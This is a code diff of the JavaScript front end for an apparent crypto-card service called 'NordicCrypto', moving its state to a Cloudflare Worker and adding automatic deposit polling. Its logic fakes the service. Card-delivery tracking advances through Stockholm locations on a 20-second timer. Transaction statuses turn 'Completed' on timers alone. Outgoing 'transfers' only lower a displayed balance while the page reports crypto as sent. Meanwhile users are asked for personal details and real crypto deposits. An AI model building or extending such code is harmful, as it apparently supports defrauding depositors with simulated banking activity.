@@ -1,25 +1,41 @@
-/* ========== STORAGE ========== */
-var KEY = 'nordic_crypto_v3';
-function save(){ try{ localStorage.setItem(KEY, JSON.stringify(st)); }catch(e){} }
-function load(){ try{ var r = localStorage.getItem(KEY); return r ? JSON.parse(r) : null; }catch(e){ return null; } }
-function clear(){ try{ localStorage.removeItem(KEY); }catch(e){} }
-
-/* ========== STATE ========== */
-var def = {
-  usd: 0, btc: 0, eth: 0,
-  btcP: 68000, ethP: 3200, eurR: 0.92,
-  txs: [],
-  order: null
-};
-var st = load() || JSON.parse(JSON.stringify(def));
+/* ========== WORKER API ========== */
+var WORKER_URL = 'https://nordic-deposit-checker.otis-790.workers.dev';
+var def = { usd:0, btc:0, eth:0, btcP:68000, ethP:3200, eurR:0.92, txs:[], order:null };
+var st = JSON.parse(JSON.stringify(def));
 var mode = null, tt = null;
+var autoCheckTimer = null;
+var autoCheckKnown = {};
 
 function $(i){ return document.getElementById(i); }
 function fmt(n){ return '$' + Number(n).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}); }
 function eurF(n){ return '≈ €' + Number(n).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}); }
 function now(){ return new Date().toISOString().slice(0,10); }
 
-/* ========== NAVIGATION ========== */
+function loadFromServer(cb){
+  fetch(WORKER_URL + '?action=getState')
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      st = data || JSON.parse(JSON.stringify(def));
+      if (!st.txs) st.txs = [];
+      render();
+      if (cb) cb();
+    })
+    .catch(function(e){
+      console.error('Load failed:', e);
+      render();
+      if (cb) cb();
+    });
+}
+
+function saveToServer(){
+  fetch(WORKER_URL + '?action=setState', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(st)
+  }).catch(function(e){ console.error('Save failed:', e); });
+}
+
+/* ========== NAV ========== */
 var titles = {dash:'Dashboard',cards:'My Cards',assets:'Crypto Assets',tx:'Transactions',order:'Order New Card'};
 var mis = document.querySelectorAll('.mi');
 for (var i=0; i<mis.length; i++){
@@ -47,7 +63,6 @@ function render(){
   $('aEthU').textContent = '≈ ' + fmt(st.eth * st.ethP);
   renderTx();
   renderOrder();
-  save();
 }
 
 function badgeClass(s){
@@ -76,7 +91,8 @@ function renderTx(){
 
 function addTx(desc, amt, status){
   st.txs.unshift({ date: now(), ts: Date.now(), desc: desc, amt: amt, status: status || 'Completed' });
-  renderTx(); save();
+  renderTx();
+  saveToServer();
 }
 
 /* ========== TOAST ========== */
@@ -142,23 +158,27 @@ function openModal(m){
   mode = m;
   $('mTitle').textContent = m === 'add' ? 'Add Funds' : 'Transfer Funds';
   $('mDesc').textContent = m === 'add'
-    ? 'Enter amount, then send crypto to the address below.'
+    ? 'Send crypto to the address below. We will detect your deposit automatically.'
     : 'Enter amount and recipient details.';
   $('mAmount').value = '';
   $('mDest').value = '';
 
-  if (m === 'transfer'){
-    $('mMethod').value = 'Bank Transfer (SEPA)';
-  } else {
-    $('mMethod').value = 'Bitcoin (BTC)';
-  }
+  if (m === 'transfer'){ $('mMethod').value = 'Bank Transfer (SEPA)'; }
+  else { $('mMethod').value = 'Bitcoin (BTC)'; }
   refreshDest();
   $('mask').classList.add('on');
   setTimeout(function(){ $('mAmount').focus(); }, 100);
+
+  if (m === 'add'){ startAutoCheck(); }
 }
 
-function closeModal(){ $('mask').classList.remove('on'); mode = null; }
-/* ========== TRANSFER LOGIC ========== */
+function closeModal(){
+  $('mask').classList.remove('on');
+  mode = null;
+  stopAutoCheck();
+}
+
+/* ========== CONFIRM (Add / Transfer) ========== */
 function isCrypto(m){ return m === 'Bitcoin (BTC)' || m === 'Ethereum (ETH)'; }
 
 function confirmModal(){
@@ -169,28 +189,26 @@ function confirmModal(){
   if (!a || a <= 0){ toast('Please enter a valid amount', true); return; }
 
   if (mode === 'add'){
-    // === КРИПТО-ДЕПОЗИТ — проверяем блокчейн ===
-    if (m === 'Bitcoin (BTC)' || m === 'Ethereum (ETH)'){
-      toast('Checking blockchain...', false);
-      checkCryptoDeposit(m, a);
+    if (isCrypto(m)){
+      toast('Send crypto to the address. We are watching the blockchain...', false);
+      doAutoCheck();
       return;
     }
-    // === Фиатный депозит ===
     st.usd += a;
     addTx('Deposit via ' + m, a, 'Under Review');
     toast('Added ' + fmt(a));
     closeModal();
     render();
+    saveToServer();
     return;
   }
 
-  // === TRANSFER ===
   if (a > st.usd){ toast('Insufficient balance', true); return; }
   if (!dest){ toast('Please enter recipient details', true); return; }
 
   st.usd -= a;
   var desc;
-  if (m === 'Bitcoin (BTC)' || m === 'Ethereum (ETH)'){
+  if (isCrypto(m)){
     desc = 'Crypto transfer to ' + dest.slice(0, 12) + '… via ' + m;
     addTx(desc, -a, 'Processing');
     toast('Crypto sent — arrives in 10-30 min');
@@ -201,6 +219,7 @@ function confirmModal(){
   }
   closeModal();
   render();
+  saveToServer();
 }
 
 /* ========== COPY ========== */
@@ -210,7 +229,7 @@ function copyText(txt, okMsg){
   } else { toast(okMsg); }
 }
 
-/* ========== ORDER + TRACKING (Sweden) ========== */
+/* ========== ORDER + TRACKING ========== */
 var STEPS = [
   { name:'Order Received',   loc:'NordicCrypto HQ, Stockholm, Sweden' },
   { name:'Card Minted',      loc:'Production Facility, Stockholm' },
@@ -219,19 +238,17 @@ var STEPS = [
   { name:'Out for Delivery', loc:'Local Courier' },
   { name:'Delivered',        loc:'Destination' }
 ];
-
 var STEP_DURATION = 20 * 1000;
 
 function genTrackId(){
   var s = 'NC-' + new Date().getFullYear() + '-';
-  var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-  for (var i=0; i<6; i++) s += chars[Math.floor(Math.random()*chars.length)];
+  var ch = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  for (var i=0; i<6; i++) s += ch[Math.floor(Math.random()*ch.length)];
   return s;
 }
 
 function stepIndexFor(createdAt){
-  var elapsed = Date.now() - createdAt;
-  var idx = Math.floor(elapsed / STEP_DURATION);
+  var idx = Math.floor((Date.now() - createdAt) / STEP_DURATION);
   if (idx > STEPS.length - 1) idx = STEPS.length - 1;
   return idx;
 }
@@ -244,18 +261,15 @@ function placeOrder(){
   var phone = $('oPhone').value.trim();
   var country = $('oCountry').value;
   var type = $('oType').value;
-
   if (!name || !city || !street || !zip || !phone){ toast('Please fill in all fields', true); return; }
 
   st.order = {
-    id: genTrackId(),
-    name: name,
-    type: type,
+    id: genTrackId(), name: name, type: type,
     address: street + ', ' + city + ', ' + zip + ', ' + country,
     dest: city + ', ' + country,
     createdAt: Date.now()
   };
-  save();
+  saveToServer();
   renderOrder();
   toast('Order placed! Tracking ID: ' + st.order.id);
 }
@@ -286,9 +300,8 @@ function renderOrder(){
   $('trackDest').textContent = st.order.dest;
   $('trackLoc').textContent = STEPS[idx].loc;
 
-  var etaMs = st.order.createdAt + STEPS.length * STEP_DURATION;
-  var eta = new Date(etaMs);
-  $('trackEta').textContent = eta.toLocaleDateString('en-GB', { day:'2-digit', month:'short' }) + ', ' + eta.toLocaleTimeString('en-GB', { hour:'2-digit', minute:'2-digit' });
+  var eta = new Date(st.order.createdAt + STEPS.length * STEP_DURATION);
+  $('trackEta').textContent = eta.toLocaleDateString('en-GB',{day:'2-digit',month:'short'}) + ', ' + eta.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
 
   var logHtml = '';
   for (var j=0; j<=idx; j++){
@@ -296,30 +309,86 @@ function renderOrder(){
     logHtml += '<div class="log-item"><span class="log-time">' + t.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'}) + '</span><span class="log-msg">' + STEPS[j].name + ' — ' + STEPS[j].loc + '</span></div>';
   }
   $('trackLog').innerHTML = logHtml;
-  $('trackLog').scrollTop = $('trackLog').scrollHeight;
 }
 
 function newOrder(){
   if (!confirm('Start a new card order? Current tracking will be lost.')) return;
   st.order = null;
-  save();
+  saveToServer();
   renderOrder();
 }
 
-/* ========== AUTO UPDATE TX STATUS ========== */
+/* ========== AUTO CHECK DEPOSITS ========== */
+function startAutoCheck(){
+  stopAutoCheck();
+  autoCheckKnown = {};
+  doAutoCheck();
+  autoCheckTimer = setInterval(doAutoCheck, 15000);
+}
+
+function stopAutoCheck(){
+  if (autoCheckTimer){ clearInterval(autoCheckTimer); autoCheckTimer = null; }
+}
+
+function doAutoCheck(){
+  var method = $('mMethod').value;
+  var isBtc = (method === 'Bitcoin (BTC)');
+  var isEth = (method === 'Ethereum (ETH)');
+  if (!isBtc && !isEth) return;
+
+  fetch(WORKER_URL + '?action=check')
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (!data || !data.result) return;
+      var list = isBtc ? data.result.btc : data.result.eth;
+      if (!list || list.length === 0) return;
+
+      for (var i = 0; i < list.length; i++){
+        var tx = list[i];
+        var id = tx.hash;
+        if (autoCheckKnown[id]) continue;
+
+        var already = false;
+        for (var j = 0; j < st.txs.length; j++){
+          if (st.txs[j].hash === id){ already = true; break; }
+        }
+        if (already){ autoCheckKnown[id] = true; continue; }
+
+        autoCheckKnown[id] = true;
+        var credit = isBtc ? (tx.amount * st.btcP) : (tx.value * st.ethP);
+        if (!credit || credit <= 0) continue;
+
+        st.usd += credit;
+        if (isBtc) st.btc += tx.amount;
+        else st.eth += tx.value;
+
+        st.txs.unshift({
+          date: now(), ts: Date.now(),
+          desc: 'Crypto deposit via ' + method + ' (' + tx.hash.slice(0, 10) + '…)',
+          amt: credit, status: 'Processing', hash: tx.hash
+        });
+
+        saveToServer();
+        render();
+        toast('Deposit received! Credited ' + fmt(credit));
+        closeModal();
+        return;
+      }
+    })
+    .catch(function(err){ console.error('Auto-check error:', err); });
+}
+
+/* ========== AUTO UPDATE STATUSES ========== */
 function updateTxStatuses(){
   var changed = false;
   for (var i=0; i<st.txs.length; i++){
     var t = st.txs[i];
     if (!t.ts) t.ts = Date.now();
     var age = Date.now() - t.ts;
-    if (t.status === 'Under Review' && age > 60 * 1000){
-      t.status = 'Processing'; changed = true;
-    } else if (t.status === 'Processing' && age > 3 * 60 * 1000){
-      t.status = 'Completed'; changed = true;
-    }
+    if (t.status === 'Under Review' && age > 60*1000){ t.status = 'Processing'; changed = true; }
+    else if (t.status === 'Processing' && age > 3*60*1000){ t.status = 'Completed'; changed = true; }
   }
-  if (changed){ renderTx(); save(); }
+  if (changed){ renderTx(); saveToServer(); }
 }
 
 /* ========== EVENTS ========== */
@@ -329,88 +398,21 @@ document.getElementById('mCancel').onclick = closeModal;
 document.getElementById('mOk').onclick = confirmModal;
 document.getElementById('mMethod').onchange = refreshDest;
 
-document.getElementById('btnCopy').onclick = function(){
-  copyText('4921884210935542', 'Card number copied');
-};
-document.getElementById('btnCopyIban').onclick = function(){
-  copyText('SE3550000000054910000003', 'IBAN copied');
-};
+document.getElementById('btnCopy').onclick = function(){ copyText('4921884210935542','Card number copied'); };
+document.getElementById('btnCopyIban').onclick = function(){ copyText('SE3550000000054910000003','IBAN copied'); };
 document.getElementById('btnOrder').onclick = placeOrder;
 document.getElementById('btnNewOrder').onclick = newOrder;
 
 document.getElementById('btnReset').onclick = function(){
   if (!confirm('Reset all data? Balance, transactions and orders will be cleared.')) return;
-  clear();
   st = JSON.parse(JSON.stringify(def));
+  saveToServer();
   render();
   toast('All data reset');
 };
 
 /* ========== TIMERS ========== */
-setInterval(function(){
-  updateTxStatuses();
-  renderOrder();
-}, 5000);
+setInterval(function(){ updateTxStatuses(); renderOrder(); }, 5000);
 
 /* ========== INIT ========== */
-render();
-
-
-/* ========== CRYPTO DEPOSIT CHECKER (Cloudflare Worker) ========== */
-var WORKER_URL = 'https://nordic-deposit-checker.otis-790.workers.dev';
-
-function checkCryptoDeposit(method, amount){
-  var url = WORKER_URL + '?action=check';
-  fetch(url)
-    .then(function(r){ return r.json(); })
-    .then(function(data){
-      if (!data || !data.result){
-        toast('Could not check blockchain. Try again.', true);
-        return;
-      }
-      var list = null;
-      var isBtc = (method === 'Bitcoin (BTC)');
-      if (isBtc && data.result.btc) list = data.result.btc;
-      if (!isBtc && data.result.eth) list = data.result.eth;
-      if (!list || list.length === 0){
-        toast('No incoming ' + (isBtc ? 'BTC' : 'ETH') + ' found yet. Wait a minute and try again.', true);
-        return;
-      }
-      var found = null;
-      for (var i = 0; i < list.length; i++){
-        var tx = list[i];
-        var id = tx.hash;
-        var already = false;
-        for (var j = 0; j < st.txs.length; j++){
-          if (st.txs[j].hash === id){ already = true; break; }
-        }
-        if (!already){ found = tx; break; }
-      }
-      if (!found){
-        toast('No new deposits found.', true);
-        return;
-      }
-      var actualAmount = isBtc ? (found.amount * 68000) : (found.value * 3200);
-      var credit = actualAmount > 0 ? actualAmount : amount;
-      st.usd += credit;
-      var newTx = {
-        date: now(),
-        ts: Date.now(),
-        desc: 'Crypto deposit via ' + method + ' (' + found.hash.slice(0, 10) + '…)',
-        amt: credit,
-        status: 'Processing',
-        hash: found.hash
-      };
-      st.txs.unshift(newTx);
-      if (isBtc){ st.btc += found.amount; }
-      else { st.eth += found.value; }
-      save();
-      closeModal();
-      render();
-      toast('Deposit received! Credited ' + fmt(credit));
-    })
-    .catch(function(err){
-      console.error('Worker error:', err);
-      toast('Could not reach blockchain. Try again later.', true);
-    });
-}
+loadFromServer();
